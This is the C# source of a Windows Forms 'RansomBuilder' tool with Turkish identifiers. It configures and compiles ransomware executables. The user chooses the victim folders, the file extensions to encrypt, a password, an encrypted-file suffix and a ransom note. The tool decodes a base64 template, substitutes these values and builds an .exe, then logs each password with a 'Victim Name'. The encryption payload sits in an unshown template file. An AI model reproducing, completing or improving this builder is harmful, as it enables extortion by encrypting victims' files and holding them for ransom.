﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;                       //ÖĞREN!! GİT ÖĞREN!! https://www.youtube.com/watch?v=UBRtdXadwQ4
namespace RansomBuilder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string s = "HAYIR";
        string icon=null;
        static Random random = new Random();
        public static string Pass(int uzunluk)
        {
            string harfler = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            return new string(Enumerable.Repeat(harfler, uzunluk)
              .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBox1.SelectedIndex == 0)
            {
                if (!checkBox3.Checked)
                {
                    if (!string.IsNullOrEmpty(textBox3.Text))
                    {
                        textBox3.Text += ", [Desktop]";
                    }
                    else
                    {
                        textBox3.Text = "[Desktop]";
                    }
                    textBox3.Text = textBox3.Text.Replace(",,", ",");
                }
                else
                {
                    textBox3.Text = "[Desktop]";
                }
            }
            else if (comboBox1.SelectedIndex == 1)
            {
                if (!checkBox3.Checked)
                {
                    if (!string.IsNullOrEmpty(textBox3.Text))
                    {
                        textBox3.Text += ", [Documents]";
                    }
                    else
                    {
                        textBox3.Text = "[Documents]";
                    }
                    textBox3.Text = textBox3.Text.Replace(",,", ",");
                }
                else
                {
                    textBox3.Text = "[Documents]";
                }
            }
            else if (comboBox1.SelectedIndex == 2)
            {
                if (!checkBox3.Checked)
                {
                    if (!string.IsNullOrEmpty(textBox3.Text))
                    {
                        textBox3.Text += ", [Pictures]";
                    }
                    else
                    {
                        textBox3.Text = "[Pictures]";
                    }
                    textBox3.Text = textBox3.Text.Replace(",,", ",");
                }
                else
                {
                    textBox3.Text = "[Pictures]";
                }
            }
        }

        private void textBox1_MouseMove(object sender, MouseEventArgs e)
        {
            textBox1.Text = Pass(30);
        }
        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return Encoding.UTF8.GetString(base64EncodedBytes);
        }
        private void button2_Click(object sender, EventArgs e)
        {
            string aqe = @"""";
            string[] ayirt = textBox2.Text.Replace(" ",string.Empty).Split(',');
            int jh = 0;
            foreach (char lk in textBox2.Text)
            {
                if (lk == '"') { jh++; }
            }
            int sonuc = jh % ayirt.Length;
            if (string.IsNullOrEmpty(textBox1.Text))
            {
                MessageBox.Show("Please type password", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (string.IsNullOrEmpty(textBox2.Text))
            {
                MessageBox.Show("Please type to crypt extension!", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (textBox2.Text.Contains("."))
            {
                MessageBox.Show("Please don't type dot into the extensions", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (!textBox2.Text.Contains('"') || !textBox2.Text.Contains(",") && checkBox2.Checked == false)
            {
                MessageBox.Show("Please type into the extensions textbox , (comma) or " + '"' + " (double quotes)", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (string.IsNullOrEmpty(textBox3.Text))
            {
                MessageBox.Show("Please type path to crypting!", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (string.IsNullOrEmpty(textBox6.Text))
            {
                MessageBox.Show("Please type your crypt extension!", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }

            else if (!textBox6.Text.Contains("."))
            {
                MessageBox.Show("Please type into the your crypt textbox dot!", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (textBox2.Text.Contains(aqe + aqe) && sonuc == 0 || textBox2.Text.Contains(aqe + " " + aqe))
            {
                MessageBox.Show("Please type into the extension textbox comma", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (textBox2.Text.Length - textBox2.Text.LastIndexOf(",") == 1 || textBox2.Text.Length - textBox2.Text.LastIndexOf(",") == 2) 
            {
                MessageBox.Show("Please check unnecessary comma in extensions text", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (sonuc != 0)
            {
                MessageBox.Show("Please check double quotes in extensions textbox!", "Exclamation!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else
            {

                SaveFileDialog dosya = new SaveFileDialog();
                dosya.Filter = "Exe | *.exe";
                if (dosya.ShowDialog() == DialogResult.OK)
                {
                    textBox2.Text = textBox2.Text.Replace(" ", string.Empty);
                    using (StreamReader reader = new StreamReader("crypt.source"))
                    {
                        try
                        {

                            string j = "+" + '@' + '"' + "\\" + '"';
                            string kod = Base64Decode(reader.ReadToEnd()).Replace("HANGIDIZINLER", textBox3.Text.Replace("[Desktop]", "Environment.GetFolderPath(Environment.SpecialFolder.Desktop)" + j).Replace("[Documents]", "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)" + j).Replace("[Pictures]", "Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)" + j)).Replace("HANGIUZANTILER", textBox2.Text.Replace(" ", string.Empty)).Replace("PASSWORD", textBox1.Text).Replace(".UZANTICRYPT", textBox6.Text).Replace(
                             "NOTISMI", textBox5.Text).Replace("MESAJ", textBox4.Text + Environment.NewLine + textBox7.Text).Replace("DEGER", s);

                            string ayar = " ";
                            if (Builder.Build(dosya.FileName, kod, ayar, icon))
                            {
                                MessageBox.Show("Build was successfully!\n" + dosya.FileName, "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                using (StreamWriter sw = File.AppendText("log.txt"))
                                {
                                    sw.WriteLine("Password is:   " + textBox1.Text + "   Hour: " + string.Format("{0:HH:mm:ss}", DateTime.Now) + " Date: " + DateTime.Now.ToString("d/M/yyyy") + " Victim Name: " + textBox7.Text);
                                }
                            }
                        }
                        catch (Exception ex) { MessageBox.Show(ex.Message, "Haahha", MessageBoxButtons.OK, MessageBoxIcon.Error); }
                    }
                }
            }
        }
    
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
 
            if (checkBox1.Checked) { s = "EVET"; } else s = "HAYIR";
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            Form2 frm2 = new Form2();
            frm2.ShowDialog();
 
        }

        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (!checkBox3.Checked)
            {
                if ((string)comboBox2.SelectedItem != "[custom]")
                {
                    if (textBox3.Text != "")
                    {
                        textBox3.Text += "," + (string)comboBox2.SelectedItem;
                    }
                    else
                    {
                         textBox3.Text = (string)comboBox2.SelectedItem;
                    }
                }
                else
                {
                int saydim = 0;
                string  ekle = Microsoft.VisualBasic.Interaction.InputBox("Path", "Please type directory", "@'your path here'".Replace("'",@""""), -1, -1);
                char l = '"';
                foreach (char h in ekle)
                {
                    if (h == l) { saydim++; }
                }
                if (ekle.Contains("@") && ekle.Contains('"') && ekle.Contains(":") && ekle.Contains("\\") && saydim == 2)
                {
                    textBox3.Text += ekle.Replace(" ", string.Empty); ;
                }
                }
            }
            else
            {
               
                if ((string)comboBox2.SelectedItem == "[custom]")
                {
                     int saydim = 0;
                     string ekle = Microsoft.VisualBasic.Interaction.InputBox("Path", "Please type directory", "@'your path here'".Replace("'", @""""), -1, -1);
                     char l = '"';
                     foreach (char h in ekle)
                     {
                         if (h == l) { saydim++; }
                     }
                    if (ekle.Contains("@") && ekle.Contains('"') && ekle.Contains(":") && ekle.Contains("\\") && saydim == 2)
                    {
                        textBox3.Text += ekle.Replace(" ",string.Empty);
                    }
                }
                else{
                textBox3.Text = (string)comboBox2.SelectedItem;}
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            textBox3.Text = string.Empty;
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if(textBox3.Text.Length>0 && checkBox3.Checked && textBox3.Text.Contains("[") == false && (string)comboBox2.SelectedItem != "[custom]")

            textBox3.Text = textBox3.Text.Substring(0, 6);
            else if (textBox3.Text.Contains("["))
            {
           
                textBox3.Text = (string)comboBox1.SelectedItem;
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            string[] n = textBox2.Text.Split(',');
            if (checkBox2.Checked)
            {
                textBox2.Text = n[random.Next(0, n.Length)];
            }
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            OpenFileDialog op = new OpenFileDialog();
            op.Title = "Select an icon";
            op.Filter = "icon files|*.ico";
            op.InitialDirectory = (string)Environment.CurrentDirectory + @"\Icons\";
            if (op.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                icon = op.FileName;
                pictureBox1.ImageLocation = op.FileName;
            }
        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            pictureBox1.Image = null;
            icon = null;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            textBox1.Text = Clipboard.GetText();
        }

    }
}
